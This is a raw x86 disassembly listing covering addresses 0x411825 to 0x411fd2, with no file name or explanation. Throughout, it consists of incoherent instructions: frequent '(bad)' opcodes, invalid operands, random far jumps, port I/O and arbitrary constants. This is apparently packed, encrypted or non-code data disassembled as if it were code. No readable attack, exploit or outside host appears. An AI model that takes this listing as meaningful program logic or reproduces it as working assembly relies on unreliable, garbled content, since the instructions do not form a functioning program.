  411825:	dec    edx
  411826:	jno    0x4117c6
  411828:	pop    esi
  411829:	mov    edi,0xa9e2d76a
  41182e:	retf   0xf644
  411831:	push   ecx
  411832:	push   eax
  411833:	mov    edi,0xc75e01cf
  411838:	(bad)  
  411839:	sahf   
  41183a:	(bad)  
  41183b:	fisubr DWORD PTR [esi-0x20]
  41183e:	xchg   esi,eax
  41183f:	and    DWORD PTR ds:0x97f099b7,edi
  411845:	inc    eax
  411846:	inc    esi
  411847:	lds    esi,FWORD PTR [ebx+0x64]
  41184a:	scas   al,BYTE PTR es:[edi]
  41184b:	xchg   edx,eax
  41184c:	imul   ebx,ebx,0x47
  41184f:	leave  
  411850:	mov    ebp,DWORD PTR [ecx-0x43]
  411853:	xchg   esi,eax
  411854:	push   eax
  411855:	mov    ds:0x7f1b6e5a,al
  41185a:	loopne 0x4118a1
  41185c:	enter  0xdbe2,0x5b
  411860:	scas   eax,DWORD PTR es:[edi]
  411861:	fwait
  411862:	sbb    DWORD PTR [ecx],esp
  411864:	pop    eax
  411865:	jae    0x411899
  411867:	icebp  
  411868:	mov    DWORD PTR [ebx+0x1124091],0x1f548e5e
  411872:	or     ah,BYTE PTR [esi]
  411874:	test   bh,0xf4
  411877:	int3   
  411878:	daa    
  411879:	jnp    0x411847
  41187b:	addr16 xchg esp,eax
  41187d:	jl     0x4118ac
  41187f:	jmp    0x8f62fc3
  411884:	xlat   BYTE PTR ds:[ebx]
  411885:	lods   eax,DWORD PTR ds:[esi]
  411886:	sti    
  411887:	ins    DWORD PTR es:[edi],dx
  411888:	je     0x41181c
  41188a:	push   ds
  41188b:	xor    eax,0x9ad7ce07
  411890:	add    BYTE PTR [edi+0x154a5b7b],bh
  411896:	xlat   BYTE PTR ds:[ebx]
  411897:	cli    
  411898:	and    BYTE PTR [ecx+0x7e],0x43
  41189c:	dec    ecx
  41189d:	nop
  41189e:	mov    DWORD PTR [esi],eax
  4118a0:	out    dx,eax
  4118a1:	aad    0x3d
  4118a3:	jecxz  0x41185c
  4118a5:	add    esi,DWORD PTR [ecx]
  4118a7:	and    al,0xa
  4118a9:	dec    eax
  4118aa:	aad    0x76
  4118ac:	leave  
  4118ad:	adc    BYTE PTR [ebx],dh
  4118af:	jge    0x4118ce
  4118b1:	shl    DWORD PTR [ebp+0x73],0x3
  4118b5:	rcl    dl,cl
  4118b7:	dec    eax
  4118b8:	jb     0x411908
  4118ba:	retf   
  4118bb:	xor    al,0x7e
  4118bd:	arpl   WORD PTR [ebx+0x69],sp
  4118c0:	push   cs
  4118c1:	xor    al,0xa
  4118c3:	pusha  
  4118c4:	cmp    esi,DWORD PTR [edx]
  4118c6:	arpl   WORD PTR [eax+edi*4-0x59],dx
  4118ca:	dec    ebp
  4118cb:	adc    eax,0x78994f76
  4118d0:	cwde   
  4118d1:	or     BYTE PTR [eax],ch
  4118d3:	pushf  
  4118d4:	rol    BYTE PTR [esi+0x7f68cae4],cl
  4118da:	push   ss
  4118db:	dec    ecx
  4118dc:	arpl   WORD PTR ds:0xfc7149dc,sp
  4118e2:	into   
  4118e3:	mov    dh,0xc9
  4118e5:	jg     0x411874
  4118e7:	ins    DWORD PTR es:[edi],dx
  4118e8:	rol    DWORD PTR [esi+eax*2],0x51
  4118ec:	jb     0x41193e
  4118ee:	sbb    BYTE PTR [esp+eiz*2-0x3f4a6daa],0x3d
  4118f6:	cli    
  4118f7:	rol    bl,cl
  4118f9:	leave  
  4118fa:	sbb    bh,al
  4118fc:	arpl   WORD PTR [ecx+0x187b1979],si
  411902:	imul   edx,DWORD PTR [eax-0x33],0x32c88780
  411909:	lock mov bl,0xb3
  41190c:	sub    edi,eax
  41190e:	inc    ebx
  41190f:	fsubrp st(3),st
  411911:	stos   BYTE PTR es:[edi],al
  411912:	imul   ebx,DWORD PTR [ecx-0x3d],0x5f38780f
  411919:	bound  ecx,QWORD PTR [edx-0x1d7ba01b]
  41191f:	popf   
  411920:	add    ch,BYTE PTR [edi+0x63]
  411923:	call   0x2ce67908
  411928:	xor    eax,0xf2f48ba5
  41192d:	push   cs
  41192e:	bound  edi,QWORD PTR [ebp+edi*1-0x5c]
  411932:	mov    bh,0x71
  411934:	jo     0x4118f2
  411936:	pop    ds
  411937:	fwait
  411938:	jmp    0x41193b
  41193a:	inc    ecx
  41193b:	ja     0x4118fa
  41193d:	fbld   TBYTE PTR [edi+0x7a297151]
  411943:	mov    edi,0xf1ff1328
  411948:	and    al,0x51
  41194a:	cmp    eax,0x3c761644
  41194f:	jge    0x411941
  411951:	stc    
  411952:	and    esp,DWORD PTR [ecx]
  411954:	or     cl,BYTE PTR [edi-0x1e]
  411957:	icebp  
  411958:	adc    ebx,eax
  41195a:	push   ebp
  41195b:	nop
  41195c:	ror    ch,1
  41195e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41195f:	aas    
  411960:	mov    dl,0x24
  411962:	not    DWORD PTR [ebx+esi*2-0x992305c]
  411969:	stc    
  41196a:	sbb    bh,BYTE PTR [ebx+0x7a]
  41196d:	sbb    edx,ebp
  41196f:	sub    cl,BYTE PTR [ebp+0x55]
  411972:	int3   
  411973:	push   ebx
  411974:	fmul   QWORD PTR [edx+0x626fe4cb]
  41197a:	sub    eax,0xf0297623
  41197f:	mov    ebx,0x136bbd11
  411984:	sbb    al,0x83
  411986:	xchg   BYTE PTR [ecx-0x17],dh
  411989:	out    0x27,al
  41198b:	push   ss
  41198c:	mov    edi,0xb9576ac6
  411991:	out    dx,ax
  411993:	xchg   bl,dh
  411995:	cmp    BYTE PTR [esi],al
  411997:	dec    esp
  411998:	fsub   st,st(1)
  41199a:	pop    ecx
  41199b:	xchg   esi,ebx
  41199d:	out    dx,eax
  41199e:	adc    DWORD PTR [ebx+0x28848f0],esp
  4119a4:	cmc    
  4119a5:	enter  0xb134,0xd1
  4119a9:	je     0x41197e
  4119ab:	jge    0x411947
  4119ad:	sub    DWORD PTR [esi+0x72],ecx
  4119b0:	sti    
  4119b1:	add    al,0x64
  4119b3:	mov    ds:0xbec8d0f,al
  4119b8:	fiadd  DWORD PTR [ecx+0xe]
  4119bb:	daa    
  4119bc:	xchg   esp,eax
  4119bd:	out    0x2a,al
  4119bf:	stos   BYTE PTR es:[edi],al
  4119c0:	jmp    0x411a3d
  4119c2:	lock fisubr WORD PTR [eax+0x5f17a75a]
  4119c9:	loopne 0x411a3c
  4119cb:	mov    dl,0xc7
  4119cd:	popa   
  4119ce:	bound  esp,QWORD PTR [edi+0x45b98db8]
  4119d4:	add    esp,ebp
  4119d6:	ror    BYTE PTR [ebx+0x4084cb22],0xef
  4119dd:	imul   eax,DWORD PTR [edx+ecx*8+0x9850fe9],0xffffff9d
  4119e5:	std    
  4119e6:	jge    0x411a40
  4119e8:	(bad)  
  4119e9:	cmp    eax,DWORD PTR [edi+0x35aa7e8f]
  4119ef:	and    al,0xc1
  4119f1:	xor    al,0xd
  4119f3:	sti    
  4119f4:	jnp    0x411a62
  4119f6:	xor    BYTE PTR [esi],ch
  4119f8:	or     BYTE PTR [eax+0x36cabb4d],bh
  4119fe:	out    0x76,eax
  411a00:	or     edx,esp
  411a02:	add    al,0x75
  411a04:	call   edi
  411a06:	and    al,0x23
  411a08:	not    DWORD PTR [eax+0x595eb99a]
  411a0e:	xchg   esp,eax
  411a0f:	mov    ecx,0x129bfa83
  411a14:	adc    dh,BYTE PTR [ebp-0x78]
  411a17:	fdiv   QWORD PTR [edx+0x71]
  411a1a:	(bad)  
  411a1c:	push   eax
  411a1d:	outs   dx,DWORD PTR ds:[esi]
  411a1e:	ds mov ah,0x4f
  411a21:	int3   
  411a22:	push   0xa494ddb6
  411a27:	fwait
  411a28:	cmp    BYTE PTR [edi-0x6d],dh
  411a2b:	loope  0x411a5e
  411a2d:	iret   
  411a2e:	mov    ch,bl
  411a30:	scas   al,BYTE PTR es:[edi]
  411a31:	sub    al,0xb9
  411a33:	dec    esp
  411a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a35:	test   eax,0x894d95e4
  411a3a:	add    eax,0xdf43f4f2
  411a3f:	fst    QWORD PTR [edi]
  411a41:	ret    0x3cb0
  411a44:	out    dx,al
  411a45:	fbld   TBYTE PTR [esi-0x15]
  411a48:	push   ebx
  411a49:	shl    BYTE PTR [ebx],0x39
  411a4c:	idiv   BYTE PTR [ecx+0xd31daab]
  411a52:	or     BYTE PTR [esi-0x6ec65751],0xf7
  411a59:	lock mov DWORD PTR [esi+ebx*2-0x49305273],ecx
  411a61:	cmp    DWORD PTR gs:[edx+eax*4],0x998e23bb
  411a69:	sub    BYTE PTR [esi+0x104a9e6],0x6e
  411a70:	and    al,0xcc
  411a72:	mov    ah,0x22
  411a74:	xor    dl,0xa5
  411a77:	mov    ?,WORD PTR [esi]
  411a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a7a:	inc    DWORD PTR ds:0xbf624088
  411a80:	ror    DWORD PTR [edi+0x21],cl
  411a83:	xchg   edx,eax
  411a84:	push   cs
  411a85:	inc    ebp
  411a86:	adc    edi,DWORD PTR [esp]
  411a89:	vpcomq xmm10,xmm1,XMMWORD PTR [edx+0x2eae92],0x58
  411a93:	hlt    
  411a94:	inc    BYTE PTR [eax-0x11250db]
  411a9a:	add    BYTE PTR [eax-0x352778be],ah
  411aa0:	(bad)  
  411aa1:	sti    
  411aa2:	inc    edi
  411aa3:	and    eax,0xbb67781a
  411aa8:	fstp   QWORD PTR [edx+0x13]
  411aab:	pusha  
  411aac:	leave  
  411aad:	dec    ebp
  411aae:	push   ebp
  411aaf:	dec    esi
  411ab0:	and    BYTE PTR [ecx+eax*2-0x55c5bf68],dl
  411ab7:	sahf   
  411ab8:	pop    es
  411ab9:	pand   mm4,QWORD PTR ds:0x4c541941
  411ac0:	fwait
  411ac1:	cmp    DWORD PTR [esi+ebx*2+0x622d6c40],eax
  411ac8:	xchg   ebx,eax
  411ac9:	pandn  mm2,mm2
  411acc:	fadd   DWORD PTR [ebx]
  411ace:	add    bh,BYTE PTR [esi-0x37ad5b2c]
  411ad4:	dec    esi
  411ad5:	fld    TBYTE PTR [ecx]
  411ad7:	sub    BYTE PTR [ecx+0x2f6b09b0],0x11
  411ade:	jb     0x411b39
  411ae0:	adc    ch,BYTE PTR ds:0x1d5dd9de
  411ae6:	pop    ebp
  411ae7:	arpl   WORD PTR [ecx+0x4e],dx
  411aea:	pop    es
  411aeb:	cdq    
  411aec:	push   es
  411aed:	mov    bh,0x5f
  411aef:	imul   edx,edi,0xfffffff8
  411af2:	pop    ss
  411af3:	inc    edi
  411af4:	xchg   BYTE PTR [ecx+0x6775c1bf],dl
  411afa:	sub    DWORD PTR [esi+0x1b3cbe50],ebp
  411b00:	out    0x30,ax
  411b03:	fcom   st(6)
  411b05:	dec    edx
  411b06:	mov    eax,0x6742162e
  411b0b:	popf   
  411b0c:	mov    WORD PTR [edx],gs
  411b0e:	pop    edi
  411b0f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  411b11:	arpl   cx,ax
  411b13:	and    ch,BYTE PTR [ebp+0x1c]
  411b16:	sub    cl,BYTE PTR [ebx]
  411b18:	jle    0x411b68
  411b1a:	push   edx
  411b1b:	int3   
  411b1c:	aas    
  411b1d:	xchg   edi,eax
  411b1e:	pop    ebx
  411b1f:	sar    DWORD PTR [esp+esi*8-0x7fdea37b],1
  411b26:	push   ebx
  411b27:	or     eax,0xebca9fca
  411b2c:	and    BYTE PTR [edi-0x35],cl
  411b2f:	pop    ebx
  411b30:	out    dx,al
  411b31:	push   es
  411b32:	mov    eax,ds:0x7b811977
  411b37:	lds    esp,FWORD PTR [esi-0x7e026c0a]
  411b3d:	pusha  
  411b3e:	pop    eax
  411b3f:	stos   DWORD PTR es:[edi],eax
  411b40:	fild   QWORD PTR [eax-0x6e44d3fa]
  411b46:	(bad)
  411b49:	inc    ebp
  411b4a:	dec    eax
  411b4b:	and    eax,0x8f2bb86d
  411b50:	in     al,0x35
  411b52:	mov    edi,DWORD PTR [edi-0x2d]
  411b55:	ss aam 0xcf
  411b58:	je     0x411ba6
  411b5a:	nop
  411b5b:	jg     0x411af3
  411b5d:	repz (bad) 
  411b5f:	cdq    
  411b60:	mov    esi,0xb1f7d82d
  411b65:	into   
  411b66:	or     BYTE PTR [esi+ebx*4+0x47],0x23
  411b6b:	inc    edi
  411b6c:	and    ecx,esp
  411b6e:	mov    ecx,0x324e1103
  411b73:	lods   al,BYTE PTR ds:[esi]
  411b74:	mov    dl,0x54
  411b76:	add    eax,DWORD PTR [edi-0x8]
  411b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b7a:	sbb    BYTE PTR [edi-0x3ccc31c6],ch
  411b80:	push   edx
  411b81:	push   ds
  411b82:	mov    ds:0x3b7df0,eax
  411b87:	mov    esp,0x39109c10
  411b8c:	mov    WORD PTR [ebx-0xc95b4c7],cs
  411b92:	stos   BYTE PTR es:[edi],al
  411b93:	icebp  
  411b94:	scas   al,BYTE PTR es:[edi]
  411b95:	arpl   WORD PTR [edi+0x71eceba],dx
  411b9b:	dec    ebp
  411b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b9d:	dec    dl
  411b9f:	pop    ecx
  411ba0:	jb     0x411b67
  411ba2:	sti    
  411ba3:	add    bh,BYTE PTR [esi+eiz*2]
  411ba6:	dec    edi
  411ba7:	mov    bl,BYTE PTR [eax+0x494bd5ea]
  411bad:	or     edx,DWORD PTR [ebp-0x350031ef]
  411bb3:	mov    dh,0x59
  411bb5:	jnp    0x411bfe
  411bb7:	or     al,0x48
  411bb9:	push   ebp
  411bba:	dec    ebx
  411bbb:	sbb    eax,esi
  411bbd:	icebp  
  411bbe:	cmp    eax,0xcf9cc001
  411bc3:	daa    
  411bc4:	mov    ds:0xf6444f47,al
  411bc9:	out    0xa,al
  411bcb:	jae    0x411c40
  411bcd:	pop    ss
  411bce:	in     al,dx
  411bcf:	pop    eax
  411bd0:	mov    al,0xfe
  411bd2:	xchg   edx,eax
  411bd3:	pop    esp
  411bd4:	cmp    ecx,0xffffffe1
  411bd7:	sub    bh,BYTE PTR [ebp+0x758c7d6c]
  411bdd:	test   DWORD PTR [esi-0x1059d3b5],eax
  411be3:	sub    esp,DWORD PTR [eax+0x33a0ac35]
  411be9:	dec    ecx
  411bea:	push   ebx
  411beb:	or     esp,DWORD PTR [esi]
  411bed:	ror    BYTE PTR [eax+0x544c6cf],0x6a
  411bf4:	or     ch,cl
  411bf6:	into   
  411bf7:	cmp    eax,0x166fe405
  411bfc:	pushf  
  411bfd:	xor    DWORD PTR [eax+0x1e],ecx
  411c00:	dec    esi
  411c01:	cld    
  411c02:	lahf   
  411c03:	inc    esi
  411c04:	inc    edi
  411c05:	mov    bl,0xc3
  411c07:	xchg   BYTE PTR [ecx+eiz*8],ah
  411c0a:	cdq    
  411c0b:	test   al,0x23
  411c0d:	inc    ebp
  411c0e:	retf   
  411c0f:	sub    DWORD PTR [ebp-0x12],0x15
  411c13:	inc    ecx
  411c14:	ret    0x9a36
  411c17:	aad    0x4a
  411c19:	sbb    esi,ebx
  411c1b:	xor    DWORD PTR [ebp-0x127c04c3],ecx
  411c21:	popf   
  411c22:	pop    ecx
  411c23:	sti    
  411c24:	dec    esp
  411c25:	cmp    ch,bh
  411c27:	imul   eax,esp,0x7f
  411c2a:	idiv   DWORD PTR [ecx]
  411c2c:	mov    dl,0x57
  411c2e:	mov    edi,0xc483cf50
  411c33:	and    ebp,DWORD PTR [ebx+ebx*4+0x2bd7bbbe]
  411c3a:	mov    al,ds:0x93e4f644
  411c3f:	mov    ebp,0x627034eb
  411c44:	nop
  411c45:	and    ebx,DWORD PTR [eax]
  411c47:	fs aam 0x2d
  411c4a:	add    al,0xf7
  411c4c:	mov    bl,0xdf
  411c4e:	cmc    
  411c4f:	and    eax,0xb400f51d
  411c54:	mov    eax,0x3afdb73d
  411c59:	pop    esp
  411c5a:	push   cs
  411c5b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c5d:	pop    edx
  411c5e:	mov    ecx,0xc3848ffc
  411c63:	in     al,0x15
  411c65:	(bad)  
  411c66:	adc    eax,0x2fc192f9
  411c6b:	xchg   esi,eax
  411c6c:	leave  
  411c6d:	sahf   
  411c6e:	sbb    edi,DWORD PTR [esi+0x6dd0f32f]
  411c74:	sub    eax,0x184d61a2
  411c79:	sbb    al,0x52
  411c7b:	test   ebp,0xd751cb81
  411c81:	pop    edx
  411c82:	sbb    cl,BYTE PTR [ebp+0x4e]
  411c85:	sbb    eax,0x76675875
  411c8a:	inc    eax
  411c8b:	cmp    ch,BYTE PTR [ebx]
  411c8d:	push   0x7e649f44
  411c92:	out    0xc4,eax
  411c94:	rcl    eax,1
  411c96:	int    0x20
  411c98:	pusha  
  411c99:	es (bad) 
  411c9b:	xor    ecx,esi
  411c9d:	in     eax,0x63
  411c9f:	ins    BYTE PTR es:[edi],dx
  411ca0:	out    0xe,eax
  411ca2:	and    DWORD PTR [edx-0x54bcb1f1],ecx
  411ca8:	cli    
  411ca9:	je     0x411d10
  411cab:	fisubr DWORD PTR [ecx]
  411cad:	retf   0x94b0
  411cb0:	add    dl,BYTE PTR [ebp+0x2dceba25]
  411cb6:	inc    esi
  411cb7:	xor    BYTE PTR [edx+0x619721c],bl
  411cbd:	ds mov ecx,0xf613aaaf
  411cc3:	enter  0x54fb,0x27
  411cc7:	mov    WORD PTR [esp+eiz*4],fs
  411cca:	mov    dh,0xa2
  411ccc:	sub    BYTE PTR [eax],bl
  411cce:	lock push ss
  411cd0:	(bad)  
  411cd2:	xchg   ebx,eax
  411cd3:	xor    ch,BYTE PTR [edi-0x6aef1d81]
  411cd9:	lods   eax,DWORD PTR ds:[esi]
  411cda:	stc    
  411cdb:	mov    ds:0x317ae56d,al
  411ce0:	fstp   QWORD PTR ds:0xe69274f5
  411ce6:	jo     0x411d46
  411ce8:	xor    al,0xce
  411cea:	fcmovnb st,st(6)
  411cec:	imul   eax,DWORD PTR [ecx],0x40eb4c
  411cf2:	cdq    
  411cf3:	inc    esi
  411cf4:	lods   eax,DWORD PTR ds:[esi]
  411cf5:	cmp    eax,0x7a489c07
  411cfa:	and    eax,ebx
  411cfc:	mov    ch,dl
  411cfe:	cli    
  411cff:	repz jns 0x411caf
  411d02:	inc    ebx
  411d03:	retf   0xfe70
  411d06:	mov    ecx,0xad3c6d9d
  411d0b:	sub    eax,0xed0907fc
  411d10:	std    
  411d11:	popf   
  411d12:	dec    edi
  411d13:	dec    edi
  411d14:	adc    DWORD PTR [esi-0x39],edx
  411d17:	fs das 
  411d19:	mov    ?,WORD PTR [ebx-0x6494a7ec]
  411d1f:	sbb    cl,0x88
  411d22:	mov    ds:0x4fc99a25,al
  411d27:	nop
  411d28:	adc    BYTE PTR [eax+ecx*1],dh
  411d2b:	pop    es
  411d2c:	cdq    
  411d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d2e:	mov    dh,0x49
  411d30:	fld    QWORD PTR [ebx+0x2d]
  411d33:	mov    dh,0xb
  411d35:	jmp    0x7129ada8
  411d3a:	rep lods al,BYTE PTR ds:[esi]
  411d3c:	cmp    bl,BYTE PTR [ebp-0x5f42a1cd]
  411d42:	jmp    0xb0f7:0x7025bf13
  411d49:	inc    ebp
  411d4a:	inc    ebx
  411d4c:	jmp    0x2b2:0x8cf7a4d2
  411d53:	movd   mm1,DWORD PTR [ebx]
  411d56:	ficomp DWORD PTR [eax]
  411d58:	mov    al,ds:0xb479eb2
  411d5d:	and    eax,0xafee7cb
  411d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d63:	or     DWORD PTR [ebx],esp
  411d65:	call   0x1ec31ea7
  411d6a:	cmc    
  411d6b:	fstp   QWORD PTR [edx]
  411d6d:	jg     0x411dc0
  411d6f:	in     eax,dx
  411d70:	aam    0x2c
  411d72:	imul   ebx,eax,0x52
  411d75:	mov    ah,0x2a
  411d77:	inc    edx
  411d78:	xlat   BYTE PTR ds:[ebx]
  411d79:	add    eax,0x3d3a48d8
  411d7e:	sbb    al,0xf8
  411d80:	(bad)  
  411d81:	and    al,0xd0
  411d83:	sahf   
  411d84:	jp     0x411d8b
  411d86:	push   0x14
  411d88:	inc    eax
  411d89:	mov    ebx,0xdb17f253
  411d8e:	and    ebx,DWORD PTR [ebx+0xa]
  411d91:	push   esi
  411d92:	mov    bh,0xa2
  411d94:	scas   eax,DWORD PTR es:[edi]
  411d95:	shl    al,0x65
  411d98:	out    dx,al
  411d99:	test   eax,0x41ff8691
  411d9e:	mov    bh,0x71
  411da0:	xchg   esi,eax
  411da1:	pop    edx
  411da2:	gs push 0xf632539e
  411da8:	lea    edx,[ebx+0x363a1789]
  411dae:	sbb    eax,0x5ff244f6
  411db3:	ficomp DWORD PTR [ebx-0x548eb125]
  411db9:	jecxz  0x411e32
  411dbb:	popf   
  411dbc:	fdiv   DWORD PTR [esi-0x3d5a6824]
  411dc2:	inc    esi
  411dc3:	fcom   DWORD PTR [ebp+eax*4-0x353dc9c2]
  411dca:	aam    0xba
  411dcc:	stos   DWORD PTR es:[edi],eax
  411dcd:	adc    eax,0x33b25e0d
  411dd2:	push   ebp
  411dd3:	into   
  411dd4:	iret   
  411dd5:	pop    ds
  411dd6:	jae    0x411db4
  411dd8:	dec    eax
  411dd9:	test   BYTE PTR [ecx-0x68],0x72
  411ddd:	jge    0x411e2d
  411ddf:	popa   
  411de0:	sbb    al,0xf
  411de2:	dec    ecx
  411de3:	push   edi
  411de4:	xchg   edi,eax
  411de5:	cmp    esp,DWORD PTR [ecx+0x585360cf]
  411deb:	sub    esp,DWORD PTR [edx-0x6dcb1033]
  411df1:	xchg   ebx,eax
  411df2:	hlt    
  411df3:	inc    ecx
  411df4:	(bad)  
  411df5:	ds inc edi
  411df7:	mov    eax,0xdc3fc315
  411dfc:	sbb    ecx,eax
  411dfe:	cdq    
  411dff:	dec    ebx
  411e00:	(bad)  
  411e02:	icebp  
  411e03:	cmp    esi,0x85084c5d
  411e09:	xchg   BYTE PTR ds:0xea967c1d,bh
  411e0f:	leave  
  411e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e11:	and    bl,BYTE PTR [edx+0x1]
  411e14:	stc    
  411e15:	pop    esi
  411e16:	sbb    dh,al
  411e18:	cwde   
  411e19:	pop    ds
  411e1a:	mov    cl,0x23
  411e1c:	jno    0x411e5b
  411e1e:	bound  ebx,QWORD PTR [esp+eiz*8]
  411e21:	add    BYTE PTR [edi+0x1d],al
  411e24:	mov    eax,es
  411e26:	fwait
  411e27:	test   al,0xea
  411e29:	fistp  QWORD PTR [ebx]
  411e2b:	dec    ecx
  411e2c:	and    al,0x68
  411e2e:	xchg   esp,eax
  411e2f:	xchg   ebp,eax
  411e30:	push   ds
  411e31:	scas   al,BYTE PTR es:[edi]
  411e32:	or     BYTE PTR [ebp-0x3ae30490],0x3e
  411e39:	stos   BYTE PTR es:[edi],al
  411e3a:	pop    esi
  411e3b:	xor    eax,0x4bbeaeb5
  411e40:	loopne 0x411dfb
  411e42:	pop    ebp
  411e43:	sar    DWORD PTR [edi],1
  411e45:	xor    al,0x3c
  411e47:	int    0x7d
  411e49:	lahf   
  411e4a:	mov    dh,0x25
  411e4c:	or     DWORD PTR [eax-0x6b93ac08],0x5d
  411e53:	icebp  
  411e54:	enter  0xf0e4,0x20
  411e58:	adc    ebp,ebx
  411e5a:	push   ss
  411e5b:	or     al,0x73
  411e5d:	pop    ss
  411e5e:	fisttp QWORD PTR [edx-0x55]
  411e61:	push   ebp
  411e62:	push   cs
  411e63:	leave  
  411e64:	inc    ebx
  411e65:	sbb    BYTE PTR [eiz*8+0xe55a11c],ah
  411e6c:	scas   al,BYTE PTR es:[edi]
  411e6d:	loop   0x411ea5
  411e6f:	xchg   ebp,eax
  411e70:	sbb    DWORD PTR [ecx-0x44],0xffffff88
  411e74:	pop    esi
  411e75:	adc    al,0xd3
  411e77:	scas   eax,DWORD PTR es:[edi]
  411e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e79:	xchg   esi,eax
  411e7a:	sub    ebx,edi
  411e7c:	xlat   BYTE PTR ds:[ebx]
  411e7d:	ja     0x411e64
  411e7f:	aam    0xab
  411e81:	mov    cl,0x52
  411e83:	mov    eax,0xf0b04a8e
  411e88:	scas   eax,DWORD PTR es:[edi]
  411e89:	ins    BYTE PTR es:[edi],dx
  411e8a:	adc    edi,ebp
  411e8c:	fist   DWORD PTR [ebp-0x2e]
  411e8f:	mov    bh,0xe2
  411e91:	pushf  
  411e92:	repnz mov fs,WORD PTR [esi-0x13]
  411e96:	sqrtps xmm4,XMMWORD PTR [edx-0x468e3815]
  411e9d:	popa   
  411e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9f:	xor    al,0x68
  411ea1:	jecxz  0x411ef6
  411ea3:	inc    edx
  411ea4:	ds xchg ebp,eax
  411ea6:	arpl   WORD PTR [edi-0x66],bx
  411ea9:	pusha  
  411eaa:	jmp    0x411efc
  411eac:	jo     0x411f07
  411eae:	out    0x52,eax
  411eb0:	adc    BYTE PTR [ecx+0x3],ah
  411eb3:	call   0x575:0x84a3732e
  411eba:	inc    edx
  411ebb:	or     dh,dl
  411ebd:	xor    al,0xfb
  411ebf:	jmp    0x9f2b9b06
  411ec4:	jnp    0x411eb8
  411ec6:	outs   dx,BYTE PTR ds:[esi]
  411ec7:	dec    edi
  411ec8:	or     DWORD PTR [ebx],ebx
  411eca:	xor    eax,0x2fdc67d4
  411ecf:	xchg   ch,cl
  411ed1:	test   bl,cl
  411ed3:	mov    ecx,0x971edaaa
  411ed8:	sbb    BYTE PTR [eax+0x58],0x5f
  411edc:	xchg   edi,eax
  411edd:	les    ebx,FWORD PTR [ebp+0x12]
  411ee0:	pop    edi
  411ee1:	ss add eax,0xbffb6373
  411ee7:	jnp    0x411ea4
  411ee9:	out    dx,eax
  411eea:	xchg   esp,eax
  411eeb:	jnp    0x411f62
  411eed:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eef:	cmp    eax,0x816949f4
  411ef4:	aas    
  411ef5:	sbb    al,0x97
  411ef7:	jnp    0x411f60
  411ef9:	dec    esp
  411efa:	scas   al,BYTE PTR es:[edi]
  411efb:	sub    BYTE PTR [ecx-0x7f1ac9b2],ah
  411f01:	or     ah,BYTE PTR ds:0x817d34c9
  411f07:	retf   0xecd3
  411f0a:	in     al,0xd5
  411f0c:	loope  0x411eae
  411f0e:	lahf   
  411f0f:	bound  edi,QWORD PTR [ecx]
  411f11:	pop    es
  411f12:	aam    0x6e
  411f14:	test   al,0x5c
  411f16:	ins    DWORD PTR es:[edi],dx
  411f17:	in     al,0xaf
  411f19:	jns    0x411f68
  411f1b:	inc    edx
  411f1c:	arpl   WORD PTR [ecx-0x7604d2cc],sp
  411f22:	xor    bl,BYTE PTR [ebp-0x2fbe71e4]
  411f28:	fwait
  411f29:	mov    DWORD PTR [ecx+esi*2+0x69],edi
  411f2d:	call   0x577c21f9
  411f32:	(bad)  
  411f33:	outs   dx,BYTE PTR ds:[esi]
  411f34:	pop    edx
  411f35:	pop    es
  411f36:	jmp    0x1d6f:0xebd6cd4b
  411f3d:	push   0xfffffff5
  411f3f:	adc    DWORD PTR [edi+0x15a5445d],0xb6928052
  411f49:	aad    0x53
  411f4b:	push   ss
  411f4c:	je     0x411ef6
  411f4e:	pop    esp
  411f4f:	loop   0x411f8e
  411f51:	inc    edx
  411f52:	inc    esi
  411f53:	sbb    al,cl
  411f55:	push   ss
  411f56:	pop    esi
  411f57:	or     DWORD PTR [esi-0x34],0x85a5671b
  411f5e:	inc    ebp
  411f5f:	or     ah,dl
  411f61:	mov    bh,0xcc
  411f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f64:	stos   DWORD PTR es:[edi],eax
  411f65:	sbb    ch,ah
  411f67:	pop    ebp
  411f68:	xchg   esp,eax
  411f69:	shl    ecx,0x3a
  411f6c:	test   al,0xf4
  411f6e:	jmp    0x9e30:0x50ffa10b
  411f75:	lahf   
  411f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f77:	mov    cl,0x3e
  411f79:	or     al,0xf6
  411f7b:	jecxz  0x411f43
  411f7d:	(bad)  
  411f7e:	dec    edi
  411f7f:	dec    ecx
  411f80:	fistp  DWORD PTR [ecx]
  411f82:	mov    al,ss:0x2f136785
  411f88:	jp     0x411f38
  411f8a:	mov    dl,0x31
  411f8c:	mov    al,BYTE PTR [eax]
  411f8e:	push   ds
  411f8f:	mov    edx,edx
  411f91:	(bad)  
  411f92:	pusha  
  411f93:	ds or  cl,BYTE PTR fs:[ecx+0x72]
  411f98:	and    eax,0x8d035c9b
  411f9d:	enter  0xc9f1,0x49
  411fa1:	pop    edi
  411fa2:	ja     0x411f78
  411fa4:	pop    eax
  411fa5:	addr16 in al,dx
  411fa7:	dec    ebp
  411fa8:	and    bl,BYTE PTR [eax-0x42]
  411fab:	sub    bh,BYTE PTR [esi]
  411fad:	mov    eax,ds:0x86eca8dc
  411fb2:	(bad)  
  411fb3:	dec    ebp
  411fb4:	jne    0x411fe1
  411fb6:	mov    eax,ds:0xb8f544a7
  411fbb:	fadd   DWORD PTR [edx+ebx*8-0x69]
  411fbf:	aas    
  411fc0:	xchg   edx,eax
  411fc1:	push   ebp
  411fc2:	sub    eax,0xcbcd93c6
  411fc7:	bound  esp,QWORD PTR [ebx-0x2a]
  411fca:	pop    edi
  411fcb:	sub    al,0x36
  411fcd:	dec    edi
  411fce:	inc    edx
  411fcf:	jl     0x411fa8
  411fd1:	push   ecx
  411fd2:	dec    edx
